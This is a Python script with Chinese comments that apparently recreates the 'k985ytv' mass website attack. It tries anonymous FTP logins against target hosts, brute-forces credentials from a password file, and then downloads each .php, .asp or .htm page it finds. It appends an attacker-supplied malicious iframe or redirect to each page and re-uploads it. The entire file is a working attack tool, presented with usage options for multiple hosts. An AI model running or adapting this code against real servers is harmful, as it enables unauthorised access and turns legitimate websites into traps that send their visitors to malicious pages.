# !/usr/bin/python
# coding=utf-8
'''
还原k985ytv攻击载体
'''
import ftplib
import optparse



def attack(username, password, tgtHost, redirect):
    '''
    将找到的网页文件注入恶意代码
    :param username:
    :param password:
    :param tgtHost:
    :param redirect: 重定向标签
    :return:
    '''
    ftp = ftplib.FTP(tgtHost)
    ftp.login(username, password)
    defPages = returnDefault(ftp)
    for defPage in defPages:
        injectPage(ftp, defPage, redirect)


def anonLogin(hostname):
    '''
    检测ftp是否支持匿名登录
    :param hostname:
    :return:
    '''
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login('anonymous', '123@123.com')
        print('\n[*] ' + str(hostname) + ' FTP Anonymous Logon Succeeded.')
        ftp.quit()
        return True
    except Exception as e:
        print('\n[-] ' + str(hostname) + ' FTP Anonymous Logon Failed.')
        return False


def bruteLogin(hostname, passwdFile):
    '''
    暴力破解ftp模块
    :param hostname:
    :param passwdFile:
    :return:
    '''
    pF = open(passwdFile, 'r')
    for line in pF.readlines():
        username = line.split(':')[0]
        password = line.split(':')[1].strip('\r').strip('\n')
        print('[+] Trying: ' + username + '/' + password)
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(username, password)
            print('\n[*] ' + str(hostname) + ' FTP Logon Succeeded: ' + username + '/' + password)
            ftp.quit()
            return (username, password)
        except Exception as e:
            pass
    print('\n[-] Could not brubrute force FTP credentials.')
    return (None, None)


def returnDefault(ftp):
    '''
    搜索ftp下的网页文件
    :param ftp:
    :return:
    '''
    try:
        # nlst()方法获取目录下的文件
        dirList = ftp.nlst()
    except:
        dirList = []
        print('[-] Could not list directory contents.')
        print('[-] Skipping To Next Target.')
        return

    retList = []
    for filename in dirList:
        # lower()方法将文件名都转换为小写的形式
        fn = filename.lower()
        if '.php' in fn or '.asp' in fn or '.htm' in fn:
            print('[+] Found default page: ' + filename)
            retList.append(filename)
    return retList


def injectPage(ftp, page, redirect):
    '''对网页文件进行注入'''
    f = open(page + '.tmp', 'w')
    # 下载FTP文件
    ftp.retrlines('RETR ' + page, f.write)
    print('[+] Downloaded Page: ' + page)
    f.write(redirect)
    f.close()
    print('[+] Injected Malicious IFrame on: ' + page)
    # 上传目标文件
    ftp.storlines('STOR ' + page, open(page + '.tmp'))
    print('[+] Uploaded Injected Page: ' + page)


def main():
    parser = optparse.OptionParser(
        '[*] Usage : ./massCompromise.py  -H <target host[s]> -r <redirect page> -f <userpass file>]')
    parser.add_option('-H', dest='hosts', type='string', help='specify target host')
    parser.add_option('-r', dest='redirect', type='string', help='specify redirect page')
    parser.add_option('-f', dest='file', type='string', help='specify userpass file')
    (options, args) = parser.parse_args()

    # 返回hosts列表，若不加split()则只返回一个字符
    hosts = str(options.hosts).split(',')
    redirect = options.redirect
    file = options.file

    # 先不用判断用户口令文件名是否输入，因为会先进行匿名登录尝试
    if hosts == None or redirect == None:
        print(parser.usage)
        exit(0)

    for host in hosts:
        username = None
        password = None
        if anonLogin(host) == True:
            username = 'anonymous'
            password = '123@123.com'
            print('[+] Using Anonymous Creds to attack')
            attack(username, password, host, redirect)
        elif file != None:
            (username, password) = bruteLogin(host, file)
            if password != None:
                print('[+] Using Cred: ' + username + '/' + password + ' to attack')
                attack(username, password, host, redirect)


if __name__ == '__main__':
    main()